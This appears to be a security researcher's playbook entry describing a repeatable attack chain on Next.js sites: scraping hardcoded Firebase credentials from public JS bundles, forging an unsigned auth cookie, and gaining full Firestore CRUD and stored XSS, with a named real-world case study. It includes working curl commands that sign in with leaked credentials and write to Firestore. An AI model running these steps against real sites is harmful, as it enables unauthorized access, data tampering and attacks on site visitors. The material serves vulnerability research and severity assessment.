# Firebase + Client-Side Auth Bypass (CMS Takeover Pattern)

**Repeatable class:** Hardcoded credentials in public JS bundle → client-side auth forge → Firebase/Firestore takeover → stored XSS.

**Case study: Naoris Protocol (naox.org, 2026-08)**

## Pattern Detection

```bash
# 1. Download JS chunks from publicly accessible Next.js site
for chunk in $(curl -s https://target | grep -oP '/_next/static/chunks/[^"]+\.js' | sort -u); do
  curl -s "https://target$chunk" > /tmp/chunks/$(basename $chunk)
done

# 2. Hunt for hardcoded credentials
grep -rn 'password\|apiKey\|firebase\|authDomain\|signInWithEmailAndPassword\|firebaseConfig' /tmp/chunks/

# 3. Check for client-side auth logic
grep -rn 'document.cookie\|auth-token\|localStorage.*auth\|checkAuthStatus\|isAuthenticated' /tmp/chunks/

# 4. Check for dangerouslySetInnerHTML (stored XSS sink)
grep -rn 'dangerouslySetInnerHTML\|innerHTML\|__html' /tmp/chunks/
```

## Naoris Chain (PROVEN)

```
JS bundle publik → admin password hardcoded ("<REDACTED-PASSWORD>")
  → cookie forge ("auth-token=true", no signature)
    → Firebase creds hardcoded (email + password in JS)
      → Firestore full CRUD (114 documents, naoris-b/blogs)
        → Storage full CRUD (39 files)
          → Stored XSS via dangerouslySetInnerHTML (no DOMPurify)
            → Every visitor = XSS victim
```

## Severity Escalation Signals

| Signal | Severity |
|--------|----------|
| Firebase `apiKey` in JS bundle | LOW (public by design, needs auth rules) |
| Firebase `email` + `password` in JS bundle | **CRITICAL** (full auth bypass) |
| `signInWithEmailAndPassword` in JS | **CRITICAL** (client-side auth) |
| `document.cookie = "auth-token=true"` | **CRITICAL** (forgeable, no signature) |
| `dangerouslySetInnerHTML` with raw Firestore data | **CRITICAL** (stored XSS to all visitors) |
| Any reference to CMS operations (create/edit/delete/publish) | **CRITICAL** (full content control) |

## Firestore Verification

```bash
# 1. Sign in with email/password from JS
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=$APIKEY" \
  -H "Content-Type: application/json" \
  -d '{"email":"...","password":"...","returnSecureToken":true}' | jq -r .idToken > /tmp/tok

# 2. List collections
TOKEN=$(cat /tmp/tok)
curl -H "Authorization: Bearer $TOKEN" \
  "https://firestore.googleapis.com/v1/projects/$PROJECTID/databases/(default)/documents?key=$APIKEY"

# 3. Read documents
curl -H "Authorization: Bearer $TOKEN" \
  "https://firestore.googleapis.com/v1/projects/$PROJECTID/databases/(default)/documents/blogs?key=$APIKEY&pageSize=1000"

# 4. Probe: create + delete test document (clean up!)
curl -X POST -H "Authorization: Bearer $TOKEN" \
  "https://firestore.googleapis.com/v1/projects/$PROJECTID/databases/(default)/documents/blogs?key=$APIKEY" \
  -d '{"fields":{"title":{"stringValue":"security-test"},"draft":{"booleanValue":true}}}'
# → VERIFY 200, then DELETE, verify 404
```

## Pitfalls

- **Firebase API key in JS is NOT a finding** — it's public by design. The finding is the **email+password** in JS.
- **Always clean up probes** — create test doc, verify, DELETE, verify 404. Zero persistent tampering.
- **Check if Firestore rules allow anonymous** — if `allow read, write: if true;` = HIGH (anyone). If only authenticated = creds-leak chain.
- **`dangerouslySetInnerHTML` without sanitization** — the sink makes it CRITICAL. Without XSS, it's HIGH (content manipulation only).